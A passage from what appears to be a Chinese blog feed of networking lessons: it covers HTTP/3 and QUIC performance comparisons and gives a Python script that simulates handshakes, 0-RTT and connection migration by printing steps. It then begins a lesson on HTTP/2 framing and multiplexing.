id="3-3-HTTP-3性能优势"><a href="#3-3-HTTP-3性能优势" class="headerlink" title="3.3 HTTP&#x2F;3性能优势"></a>3.3 HTTP&#x2F;3性能优势</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">性能对比：</span><br><br><span class="hljs-string">场景1：首次访问网站</span><br><span class="hljs-attr">HTTP/2:</span><br><span class="hljs-string">├─</span> <span class="hljs-string">TCP握手:</span> <span class="hljs-string">50ms</span><br><span class="hljs-string">├─</span> <span class="hljs-string">TLS握手:</span> <span class="hljs-string">50ms</span><br><span class="hljs-string">├─</span> <span class="hljs-string">HTTP请求:</span> <span class="hljs-string">50ms</span><br><span class="hljs-string">└─</span> <span class="hljs-string">总计:</span> <span class="hljs-string">150ms</span><br><br><span class="hljs-attr">HTTP/3:</span><br><span class="hljs-string">├─</span> <span class="hljs-string">QUIC握手+请求:</span> <span class="hljs-string">50ms</span><br><span class="hljs-string">└─</span> <span class="hljs-string">总计:</span> <span class="hljs-string">50ms</span>  <span class="hljs-string">✅</span> <span class="hljs-string">快3倍</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">场景2：弱网环境（丢包率5%）</span><br><span class="hljs-attr">HTTP/2:</span><br><span class="hljs-string">├─</span> <span class="hljs-string">丢包导致TCP重传</span><br><span class="hljs-string">├─</span> <span class="hljs-string">所有流被阻塞</span><br><span class="hljs-string">└─</span> <span class="hljs-string">总计:</span> <span class="hljs-string">1000ms</span><br><br><span class="hljs-attr">HTTP/3:</span><br><span class="hljs-string">├─</span> <span class="hljs-string">丢包只影响特定流</span><br><span class="hljs-string">├─</span> <span class="hljs-string">其他流继续传输</span><br><span class="hljs-string">└─</span> <span class="hljs-string">总计:</span> <span class="hljs-string">400ms</span>  <span class="hljs-string">✅</span> <span class="hljs-string">快2.5倍</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">场景3：移动网络切换</span><br><span class="hljs-attr">HTTP/2:</span><br><span class="hljs-string">├─</span> <span class="hljs-string">连接断开</span><br><span class="hljs-string">├─</span> <span class="hljs-string">重新建立连接:</span> <span class="hljs-string">150ms</span><br><span class="hljs-string">├─</span> <span class="hljs-string">重新请求数据</span><br><span class="hljs-string">└─</span> <span class="hljs-string">总计:</span> <span class="hljs-string">300ms</span><br><br><span class="hljs-attr">HTTP/3:</span><br><span class="hljs-string">├─</span> <span class="hljs-string">连接迁移</span><br><span class="hljs-string">├─</span> <span class="hljs-string">无需重新建立</span><br><span class="hljs-string">└─</span> <span class="hljs-string">总计:</span> <span class="hljs-string">10ms</span>  <span class="hljs-string">✅</span> <span class="hljs-string">快30倍</span><br></code></pre></td></tr></table></figure><hr><h2 id="4-实战项目：HTTP-3概念演示"><a href="#4-实战项目：HTTP-3概念演示" class="headerlink" title="4. 实战项目：HTTP&#x2F;3概念演示"></a>4. 实战项目：HTTP&#x2F;3概念演示</h2><h3 id="4-1-项目说明"><a href="#4-1-项目说明" class="headerlink" title="4.1 项目说明"></a>4.1 项目说明</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">注意：HTTP/3实现需要专门的库支持<br>本项目将演示核心概念和模拟实现<br><br>功能：<br><span class="hljs-bullet">1.</span> QUIC连接建立模拟<br><span class="hljs-bullet">2.</span> 0-RTT演示<br><span class="hljs-bullet">3.</span> 连接迁移演示<br><span class="hljs-bullet">4.</span> 性能对比分析<br></code></pre></td></tr></table></figure><h3 id="4-2-代码实现"><a href="#4-2-代码实现" class="headerlink" title="4.2 代码实现"></a>4.2 代码实现</h3><pre><code class="language-python"># day29_http3_demo.py# 功能：HTTP/3和QUIC协议概念演示import timeimport randomfrom typing import Dict, List, Tuplefrom enum import Enumclass PacketType(Enum):    &quot;&quot;&quot;QUIC数据包类型&quot;&quot;&quot;    INITIAL = &quot;Initial&quot;    HANDSHAKE = &quot;Handshake&quot;    RETRY = &quot;Retry&quot;    ZERORTT = &quot;0-RTT&quot;    ONERTT = &quot;1-RTT&quot;class QUICPacket:    &quot;&quot;&quot;    QUIC数据包模拟    属性：        packet_type: 数据包类型        connection_id: 连接ID        packet_number: 包序号        payload: 负载数据    &quot;&quot;&quot;    def __init__(self, packet_type: PacketType, connection_id: str,                 packet_number: int, payload: str = &quot;&quot;):        self.packet_type = packet_type        self.connection_id = connection_id        self.packet_number = packet_number        self.payload = payload        self.timestamp = time.time()    def __repr__(self):        return (f&quot;QUICPacket(type={self.packet_type.value}, &quot;                f&quot;conn_id={self.connection_id}, &quot;                f&quot;pkt_num={self.packet_number})&quot;)class QUICConnection:    &quot;&quot;&quot;    QUIC连接模拟    功能：        1. 连接建立（1-RTT和0-RTT）        2. 数据传输        3. 连接迁移    &quot;&quot;&quot;    def __init__(self, connection_id: str):        &quot;&quot;&quot;        初始化QUIC连接        参数：            connection_id: 连接标识符        &quot;&quot;&quot;        self.connection_id = connection_id        self.is_established = False        self.packet_number = 0        self.rtt = 50  # 模拟往返时间（毫秒）        self.sent_packets = []        self.received_packets = []        self.session_ticket = None  # 用于0-RTT        self.client_ip = &quot;192.168.1.100&quot;        self.server_ip = &quot;93.184.216.34&quot;    def handshake_1rtt(self):        &quot;&quot;&quot;        1-RTT握手（首次连接）        工作流程：            客户端 → Initial (Client Hello)            服务器 → Handshake (Server Hello, Certificate, Finished)            客户端 → Handshake (Finished) + 1-RTT (Application Data)        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; QUIC 1-RTT握手演示&quot;)        print(&quot;=&quot;*60)        print(f&quot;\n连接ID: {self.connection_id}&quot;)        print(f&quot;客户端: {self.client_ip}&quot;)        print(f&quot;服务器: {self.server_ip}&quot;)        print(f&quot;RTT: {self.rtt}ms&quot;)        start_time = time.time()        # 步骤1：客户端发送Initial包        print(&quot;\n[0ms] 客户端 → Initial Packet&quot;)        initial_pkt = QUICPacket(            PacketType.INITIAL,            self.connection_id,            self.packet_number,            &quot;Client Hello + QUIC Parameters&quot;        )        self.sent_packets.append(initial_pkt)        self.packet_number += 1        print(f&quot;  内容: {initial_pkt.payload}&quot;)        # 模拟网络延迟        time.sleep(self.rtt / 2000)  # RTT的一半        # 步骤2：服务器响应Handshake包        print(f&quot;\n[{self.rtt//2}ms] 服务器 → Handshake Packet&quot;)        handshake_pkt = QUICPacket(            PacketType.HANDSHAKE,            self.connection_id,            0,            &quot;Server Hello + Certificate + Finished&quot;        )        self.received_packets.append(handshake_pkt)        print(f&quot;  内容: {handshake_pkt.payload}&quot;)        # 模拟网络延迟        time.sleep(self.rtt / 2000)        # 步骤3：客户端发送Finished和应用数据        print(f&quot;\n[{self.rtt}ms] 客户端 → Handshake + 1-RTT Data&quot;)        finished_pkt = QUICPacket(            PacketType.HANDSHAKE,            self.connection_id,            self.packet_number,            &quot;Finished&quot;        )        self.sent_packets.append(finished_pkt)        self.packet_number += 1        print(f&quot;  握手完成&quot;)        data_pkt = QUICPacket(            PacketType.ONERTT,            self.connection_id,            self.packet_number,            &quot;HTTP/3 GET /index.html&quot;        )        self.sent_packets.append(data_pkt)        self.packet_number += 1        print(f&quot;  应用数据: {data_pkt.payload}&quot;)        # 连接建立完成        self.is_established = True        # 保存会话票据用于0-RTT        self.session_ticket = f&quot;ticket_{self.connection_id}_{int(time.time())}&quot;        elapsed = (time.time() - start_time) * 1000        print(f&quot;\n✅ 连接建立完成！&quot;)        print(f&quot;总耗时: {elapsed:.2f}ms (约1-RTT)&quot;)        print(f&quot;会话票据: {self.session_ticket}&quot;)        return elapsed    def handshake_0rtt(self):        &quot;&quot;&quot;        0-RTT握手（再次连接）        工作原理：            客户端使用之前保存的会话票据和密钥            可以在第一个数据包中就发送应用数据        &quot;&quot;&quot;        if not self.session_ticket:            print(&quot;❌ 没有会话票据，无法使用0-RTT&quot;)            return None        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; QUIC 0-RTT握手演示&quot;)        print(&quot;=&quot;*60)        print(f&quot;\n连接ID: {self.connection_id}&quot;)        print(f&quot;会话票据: {self.session_ticket}&quot;)        print(&quot;使用之前保存的密钥&quot;)        start_time = time.time()        # 步骤1：客户端直接发送应用数据        print(&quot;\n[0ms] 客户端 → Initial + 0-RTT Data&quot;)        initial_pkt = QUICPacket(            PacketType.ZERORTT,            self.connection_id,            self.packet_number,            &quot;HTTP/3 GET /style.css&quot;        )        self.sent_packets.append(initial_pkt)        self.packet_number += 1        print(f&quot;  会话票据: {self.session_ticket}&quot;)        print(f&quot;  应用数据: {initial_pkt.payload}&quot;)        elapsed = (time.time() - start_time) * 1000        print(f&quot;\n✅ 0-RTT发送完成！无需等待握手！&quot;)        print(f&quot;总耗时: {elapsed:.2f}ms (0-RTT)&quot;)        return elapsed    def migrate_connection(self, new_ip: str):        &quot;&quot;&quot;        连接迁移演示        参数：            new_ip: 新的IP地址        工作原理：            使用Connection ID标识连接            IP变化不影响连接状态        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; QUIC连接迁移演示&quot;)        print(&quot;=&quot;*60)        old_ip = self.client_ip        print(f&quot;\n网络切换检测:&quot;)        print(f&quot;  旧IP: {old_ip} (WiFi)&quot;)        print(f&quot;  新IP: {new_ip} (4G)&quot;)        print(f&quot;  连接ID: {self.connection_id}&quot;)        start_time = time.time()        # 更新IP        self.client_ip = new_ip        # 使用新IP发送数据包        print(f&quot;\n使用新IP发送数据包...&quot;)        migration_pkt = QUICPacket(            PacketType.ONERTT,            self.connection_id,  # Connection ID不变            self.packet_number,            &quot;Path Challenge&quot;        )        self.sent_packets.append(migration_pkt)        self.packet_number += 1        # 模拟网络延迟        time.sleep(self.rtt / 1000)        print(f&quot;  服务器识别Connection ID: {self.connection_id}&quot;)        print(f&quot;  更新路径: {old_ip} → {new_ip}&quot;)        print(f&quot;  验证新路径...&quot;)        response_pkt = QUICPacket(            PacketType.ONERTT,            self.connection_id,            0,            &quot;Path Response&quot;        )        self.received_packets.append(response_pkt)        elapsed = (time.time() - start_time) * 1000        print(f&quot;\n✅ 连接迁移完成！&quot;)        print(f&quot;总耗时: {elapsed:.2f}ms&quot;)        print(f&quot;无需重新握手，继续使用原连接！&quot;)        return elapsed    def send_data(self, data: str, stream_id: int):        &quot;&quot;&quot;        发送应用数据        参数：            data: 要发送的数据            stream_id: 流ID        &quot;&quot;&quot;        pkt = QUICPacket(            PacketType.ONERTT,            self.connection_id,            self.packet_number,            f&quot;Stream {stream_id}: {data}&quot;        )        self.sent_packets.append(pkt)        self.packet_number += 1        print(f&quot;发送数据: {pkt.payload}&quot;)class ProtocolComparison:    &quot;&quot;&quot;    协议性能对比    &quot;&quot;&quot;    @staticmethod    def compare_handshake():        &quot;&quot;&quot;        对比握手性能        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; 协议握手性能对比&quot;)        print(&quot;=&quot;*60)        rtt = 50  # 假设RTT为50ms        print(f&quot;\n假设条件：RTT = {rtt}ms\n&quot;)        # HTTP/1.1        print(&quot;HTTP/1.1 over TCP + TLS:&quot;)        print(&quot;  TCP握手:     1-RTT ({rtt}ms)&quot;)        print(&quot;  TLS握手:     2-RTT ({rtt*2}ms)&quot;)        print(&quot;  HTTP请求:    1-RTT ({rtt}ms)&quot;)        http1_total = rtt * 4        print(f&quot;  总计:        4-RTT ({http1_total}ms)&quot;)        # HTTP/2        print(f&quot;\nHTTP/2 over TCP + TLS 1.3:&quot;)        print(f&quot;  TCP握手:     1-RTT ({rtt}ms)&quot;)        print(f&quot;  TLS 1.3握手: 1-RTT ({rtt}ms)&quot;)        print(f&quot;  HTTP请求:    1-RTT ({rtt}ms)&quot;)        http2_total = rtt * 3        print(f&quot;  总计:        3-RTT ({http2_total}ms)&quot;)        # HTTP/3 (1-RTT)        print(f&quot;\nHTTP/3 over QUIC (1-RTT):&quot;)        print(f&quot;  QUIC握手+请求: 1-RTT ({rtt}ms)&quot;)        http3_1rtt = rtt        print(f&quot;  总计:        1-RTT ({http3_1rtt}ms)&quot;)        # HTTP/3 (0-RTT)        print(f&quot;\nHTTP/3 over QUIC (0-RTT):&quot;)        print(f&quot;  直接发送数据: 0-RTT (0ms)&quot;)        http3_0rtt = 0        print(f&quot;  总计:        0-RTT ({http3_0rtt}ms)&quot;)        # 总结        print(f&quot;\n性能提升：&quot;)        print(f&quot;  HTTP/3(1-RTT) vs HTTP/1.1: {(1 - http3_1rtt/http1_total)*100:.1f}%&quot;)        print(f&quot;  HTTP/3(1-RTT) vs HTTP/2:   {(1 - http3_1rtt/http2_total)*100:.1f}%&quot;)        print(f&quot;  HTTP/3(0-RTT) vs HTTP/2:   {(1 - http3_0rtt/http2_total)*100:.1f}%&quot;)    @staticmethod    def compare_packet_loss():        &quot;&quot;&quot;        对比丢包影响        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; 丢包影响对比&quot;)        print(&quot;=&quot;*60)        print(&quot;&quot;&quot;场景：同时传输3个流，每个流10个包，第2个流丢失1个包HTTP/2 over TCP:┌─────────────────────────────────────────────────────┐│ 流1: [1][2][3][4][5][6][7][8][9][10] ⏸️ 等待      ││ 流2: [1][X][等待重传...] ⏸️ 阻塞                  ││ 流3: [1][2][3][4][5][6][7][8][9][10] ⏸️ 等待      │└─────────────────────────────────────────────────────┘问题：TCP要求按序交付，流2的丢包阻塞所有流影响：所有30个包都要等待流2重传完成HTTP/3 over QUIC:┌─────────────────────────────────────────────────────┐│ 流1: [1][2][3][4][5][6][7][8][9][10] ✅ 完成       ││ 流2: [1][X][等待重传...] ⏸️ 只影响流2            ││ 流3: [1][2][3][4][5][6][7][8][9][10] ✅ 完成       │└─────────────────────────────────────────────────────┘优势：每个流独立，流2的丢包只影响流2自己影响：只有1个包需要重传，其他29个包正常传输性能差异（丢包率5%）：- HTTP/2: 所有传输被阻塞，延迟增加200%+- HTTP/3: 只有受影响的流需要重传，延迟增加10%结论：在弱网环境下，HTTP/3性能优势更明显        &quot;&quot;&quot;)def main():    &quot;&quot;&quot;主程序&quot;&quot;&quot;    print(&quot;&quot;&quot;    ╔══════════════════════════════════════════════════════════╗    ║       HTTP/3 &amp; QUIC 协议演示 v1.0                         ║    ║       HTTP/3 &amp; QUIC Protocol Demo                        ║    ╚══════════════════════════════════════════════════════════╝    &quot;&quot;&quot;)    # 生成Connection ID    conn_id = f&quot;conn_{random.randint(10000, 99999)}&quot;    # 创建QUIC连接    conn = QUICConnection(conn_id)    # 1. 演示1-RTT握手    print(&quot;\n【演示1：首次连接 - 1-RTT握手】&quot;)    rtt_1 = conn.handshake_1rtt()    input(&quot;\n按Enter继续...&quot;)    # 2. 演示0-RTT握手    print(&quot;\n【演示2：再次连接 - 0-RTT握手】&quot;)    rtt_0 = conn.handshake_0rtt()    input(&quot;\n按Enter继续...&quot;)    # 3. 演示连接迁移    print(&quot;\n【演示3：网络切换 - 连接迁移】&quot;)    conn.migrate_connection(&quot;10.0.0.50&quot;)    input(&quot;\n按Enter继续...&quot;)    # 4. 性能对比    print(&quot;\n【演示4：协议性能对比】&quot;)    ProtocolComparison.compare_handshake()    input(&quot;\n按Enter继续...&quot;)    ProtocolComparison.compare_packet_loss()    # 总结    print(&quot;\n&quot; + &quot;=&quot;*60)    print(&quot; 总结&quot;)    print(&quot;=&quot;*60)    print(&quot;&quot;&quot;HTTP/3 和 QUIC 的核心优势：1. 更快的连接建立   ✅ 1-RTT或0-RTT，比HTTP/2快2-3倍2. 消除队头阻塞   ✅ 每个流独立，丢包只影响单个流3. 连接迁移   ✅ 网络切换无需重新连接4. 改进的拥塞控制   ✅ 基于QUIC，更灵活的拥塞控制算法5. 内置加密   ✅ 默认TLS 1.3加密，更安全6. 更快的发展   ✅ 基于UDP，在用户空间实现，更新更快适用场景：- 移动网络（频繁切换）- 弱网环境（高丢包率）- 实时应用（低延迟要求）- 视频流媒体- Web应用下一节我们将学习RESTful API设计！    &quot;&quot;&quot;)if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>28天：HTTP/2协议特性</title>
    <link href="/2025/11/10/28%E5%A4%A9%EF%BC%9AHTTP_2%E5%8D%8F%E8%AE%AE%E7%89%B9%E6%80%A7/"/>
    <url>/2025/11/10/28%E5%A4%A9%EF%BC%9AHTTP_2%E5%8D%8F%E8%AE%AE%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="第28天：HTTP-2协议特性"><a href="#第28天：HTTP-2协议特性" class="headerlink" title="第28天：HTTP&#x2F;2协议特性"></a>第28天：HTTP&#x2F;2协议特性</h1><blockquote><p>“HTTP&#x2F;2就像从单车道升级到多车道高速公路，让网页加载快如闪电！”</p></blockquote><h2 id="📚-今日目标"><a href="#📚-今日目标" class="headerlink" title="📚 今日目标"></a>📚 今日目标</h2><ul><li>理解HTTP&#x2F;1.1的性能瓶颈</li><li>掌握HTTP&#x2F;2的核心特性</li><li>学习二进制分帧机制</li><li>理解多路复用原理</li><li>实现HTTP&#x2F;2客户端</li></ul><hr><h2 id="1-HTTP-1-1的问题"><a href="#1-HTTP-1-1的问题" class="headerlink" title="1. HTTP&#x2F;1.1的问题"></a>1. HTTP&#x2F;1.1的问题</h2><h3 id="1-1-性能瓶颈"><a href="#1-1-性能瓶颈" class="headerlink" title="1.1 性能瓶颈"></a>1.1 性能瓶颈</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTP/1.1存在的主要问题：<br><br><span class="hljs-bullet">1.</span> 队头阻塞 (Head-of-Line Blocking)<br>   ┌──────────────────────────────────────┐<br>   │  请求1  →  等待响应1                  │<br>   │  请求2  →  等待请求1完成才能发送      │<br>   │  请求3  →  等待请求2完成才能发送      │<br>   └──────────────────────────────────────┘<br><br>   问题：一个慢请求会阻塞后面所有请求<br><br><span class="hljs-bullet">2.</span> 连接数限制<br><span class="hljs-bullet">   -</span> 浏览器对每个域名限制6-8个并发连接<br><span class="hljs-bullet">   -</span> 需要域名分片(Domain Sharding)来绕过限制<br><span class="hljs-bullet">   -</span> 增加DNS查询和TCP连接开销<br><br><span class="hljs-bullet">3.</span> 头部冗余<br><span class="hljs-bullet">   -</span> 每个请求都要发送完整的HTTP头<br><span class="hljs-bullet">   -</span> Cookie等信息重复发送<br><span class="hljs-bullet">   -</span> 浪费带宽<br><br><span class="hljs-bullet">4.</span> 无法设置优先级<br><span class="hljs-bullet">   -</span> 所有资源平等对待<br><span class="hljs-bullet">   -</span> 关键资源可能被延迟加载<br></code></pre></td></tr></table></figure><h3 id="1-2-生活化类比"><a href="#1-2-生活化类比" class="headerlink" title="1.2 生活化类比"></a>1.2 生活化类比</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs abnf">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-operator">=</span> 单车道收费站<br>┌─────────────────────────────────────────────┐<br>│  车<span class="hljs-number">1</span> → 正在收费                              │<br>│  车<span class="hljs-number">2</span> → 等待车<span class="hljs-number">1</span>                               │<br>│  车<span class="hljs-number">3</span> → 等待车<span class="hljs-number">2</span>                               │<br>│  车<span class="hljs-number">4</span> → 等待车<span class="hljs-number">3</span>                               │<br>└─────────────────────────────────────────────┘<br>问题：一辆车慢了，后面全都慢<br><br>HTTP/<span class="hljs-number">2</span> <span class="hljs-operator">=</span> 多车道收费站（ETC）<br>┌─────────────────────────────────────────────┐<br>│  车<span class="hljs-number">1</span>、车<span class="hljs-number">2</span>、车<span class="hljs-number">3</span>、车<span class="hljs-number">4</span>  → 同时通过              │<br>└─────────────────────────────────────────────┘<br>优势：所有车同时快速通过<br></code></pre></td></tr></table></figure><hr><h2 id="2-HTTP-2核心特性"><a href="#2-HTTP-2核心特性" class="headerlink" title="2. HTTP&#x2F;2核心特性"></a>2. HTTP&#x2F;2核心特性</h2><h3 id="2-1-特性概览"><a href="#2-1-特性概览" class="headerlink" title="2.1 特性概览"></a>2.1 特性概览</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTP/2的五大核心特性：<br><br><span class="hljs-bullet">1.</span> 二进制分帧 (Binary Framing)<br><span class="hljs-bullet">   -</span> HTTP/1.1: 文本协议<br><span class="hljs-bullet">   -</span> HTTP/2: 二进制协议<br><span class="hljs-bullet">   -</span> 更高效的解析和传输<br><br><span class="hljs-bullet">2.</span> 多路复用 (Multiplexing)<br><span class="hljs-bullet">   -</span> 单个TCP连接<br><span class="hljs-bullet">   -</span> 多个请求/响应并行<br><span class="hljs-bullet">   -</span> 无队头阻塞<br><br><span class="hljs-bullet">3.</span> 头部压缩 (Header Compression)<br><span class="hljs-bullet">   -</span> HPACK压缩算法<br><span class="hljs-bullet">   -</span> 减少头部大小<br><span class="hljs-bullet">   -</span> 维护头部字典<br><br><span class="hljs-bullet">4.</span> 服务器推送 (Server Push)<br><span class="hljs-bullet">   -</span> 主动推送资源<br><span class="hljs-bullet">   -</span> 无需客户端请求<br><span class="hljs-bullet">   -</span> 提前加载关键资源<br><br><span class="hljs-bullet">5.</span> 请求优先级 (Stream Priority)<br><span class="hljs-bullet">   -</span> 设置资源优先级<br><span class="hljs-bullet">   -</span> 关键资源优先加载<br><span class="hljs-bullet">   -</span> 优化页面渲染<br></code></pre></td></tr></table></figure><h3 id="2-2-二进制分帧层"><a href="#2-2-二进制分帧层" class="headerlink" title="2.2 二进制分帧层"></a>2.2 二进制分帧层</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs nix">HTTP<span class="hljs-operator">/</span><span class="hljs-number">2</span>的分层结构：<br><br>应用层<br>  ↓<br>┌─────────────────────────────────────┐<br>│  HTTP<span class="hljs-symbol">/2</span> 语义层                       │<br>│  (请求、响应、头部、数据)             │<br>└─────────────────────────────────────┘<br>  ↓<br>┌─────────────────────────────────────┐<br>│  HTTP<span class="hljs-symbol">/2</span> 分帧层 (Binary Framing)     │<br>│  <span class="hljs-operator">-</span> 将消息分割成帧                    │<br>│  <span class="hljs-operator">-</span> 帧类型：HEADERS, DATA, etc.      │<br>└─────────────────────────────────────┘<br>  ↓<br>TCP<span class="hljs-operator">/</span>IP协议栈<br><br>帧的结构：<br>┌──────────┬──────────┬──────────┬──────────┐<br>│ Length   │ Type     │ Flags    │ Stream ID│<br>│ (<span class="hljs-number">3</span>字节)  │ (<span class="hljs-number">1</span>字节)  │ (<span class="hljs-number">1</span>字节)  │ (<span class="hljs-number">4</span>字节)   │<br>├──────────┴──────────┴──────────┴──────────┤<br>│             Frame Payload                 │<br>│             (帧负载)                       │<br>└───────────────────────────────────────────┘<br><br>帧类型：<br><span class="hljs-operator">-</span> <span class="hljs-params">DATA:</span> 传输数据<br><span class="hljs-operator">-</span> <span class="hljs-params">HEADERS:</span> 传输头部<br><span class="hljs-operator">-</span> <span class="hljs-params">PRIORITY:</span> 设置优先级<br><span class="hljs-operator">-</span> <span class="hljs-params">RST_STREAM:</span> 终止流<br><span class="hljs-operator">-</span> <span class="hljs-params">SETTINGS:</span> 设置参数<br><span class="hljs-operator">-</span> <span class="hljs-params">PUSH_PROMISE:</span> 服务器推送<br><span class="hljs-operator">-</span> <span class="hljs-params">PING:</span> 心跳检测<br><span class="hljs-operator">-</span> <span class="hljs-params">GOAWAY:</span> 关闭连接<br><span class="hljs-operator">-</span> <span class="hljs-params">WINDOW_UPDATE:</span> 流量控制<br><span class="hljs-operator">-</span> <span class="hljs-params">CONTINUATION:</span> 延续头部<br></code></pre></td></tr></table></figure><h3 id="2-3-多路复用原理"><a href="#2-3-多路复用原理" class="headerlink" title="2.3 多路复用原理"></a>2.3 多路复用原理</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs stylus">HTTP/<span class="hljs-number">1.1</span> vs HTTP/<span class="hljs-number">2</span> 连接模型：<br><br>HTTP/<span class="hljs-number">1.1</span>（需要多个连接）：<br>连接<span class="hljs-number">1</span>: GET /index<span class="hljs-selector-class">.html</span>  →  <span class="hljs-selector-attr">[====响应====]</span><br>连接<span class="hljs-number">2</span>: GET /style<span class="hljs-selector-class">.css</span>   →       <span class="hljs-selector-attr">[====响应====]</span><br>连接<span class="hljs-number">3</span>: GET /script<span class="hljs-selector-class">.js</span>   →            <span class="hljs-selector-attr">[====响应====]</span><br>连接<span class="hljs-number">4</span>: GET /<span class="hljs-selector-tag">image</span><span class="hljs-selector-class">.png</span>   →                 <span class="hljs-selector-attr">[====响应====]</span><br><br>问题：<br>- 需要建立多个TCP连接<br>- 每个连接的握手开销<br>- 连接数受限制<br><br>HTTP/<span class="hljs-number">2</span>（单个连接，多个流）：<br>单个TCP连接:<br>  流<span class="hljs-number">1</span>: GET /index<span class="hljs-selector-class">.html</span>  →  <span class="hljs-selector-attr">[==响应==]</span><br>  流<span class="hljs-number">3</span>: GET /style<span class="hljs-selector-class">.css</span>   →    <span class="hljs-selector-attr">[==响应==]</span><br>  流<span class="hljs-number">5</span>: GET /script<span class="hljs-selector-class">.js</span>   →  <span class="hljs-selector-attr">[==响应==]</span><br>  流<span class="hljs-number">7</span>: GET /<span class="hljs-selector-tag">image</span><span class="hljs-selector-class">.png</span>   →      <span 